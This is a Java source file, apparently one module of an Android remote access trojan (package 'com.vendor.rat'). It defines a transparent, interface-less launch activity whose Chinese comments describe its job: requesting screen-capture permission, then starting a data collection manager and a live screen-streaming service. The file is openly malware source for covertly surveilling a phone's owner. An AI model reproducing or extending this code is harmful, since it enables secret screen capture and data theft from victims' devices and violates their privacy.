package com.vendor.rat.activity;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import com.vendor.rat.MainApplication;
import com.vendor.rat.control.service.MediaLiveService;
import com.vendor.rat.data.collector.DataCollectionManager;

/**
 * 启动 Activity (模块 08)
 *
 * 透明/无界面，用于:
 *   1. 请求 MediaProjection 权限
 *   2. 启动核心服务
 */
public class ActivMain extends Activity {

    private static final String TAG = "ActivMain";
    private static final int REQUEST_MEDIA_PROJECTION = 1001;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if (!MainApplication.getInstance().isInitialized()) {
            new Handler(Looper.getMainLooper()).postDelayed(this::startServices, 2000);
        } else {
            startServices();
        }
    }

    private void startServices() {
        requestMediaProjection();
        DataCollectionManager.getInstance().startAll();
    }

    private void requestMediaProjection() {
        MediaProjectionManager manager = (MediaProjectionManager)
            getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        if (manager != null) {
            startActivityForResult(
                manager.createScreenCaptureIntent(),
                REQUEST_MEDIA_PROJECTION
            );
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == REQUEST_MEDIA_PROJECTION && resultCode == RESULT_OK) {
            Intent serviceIntent = new Intent(this, MediaLiveService.class);
            serviceIntent.putExtra("code", resultCode);
            serviceIntent.putExtra("data", data);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        }

        finish();
    }
}
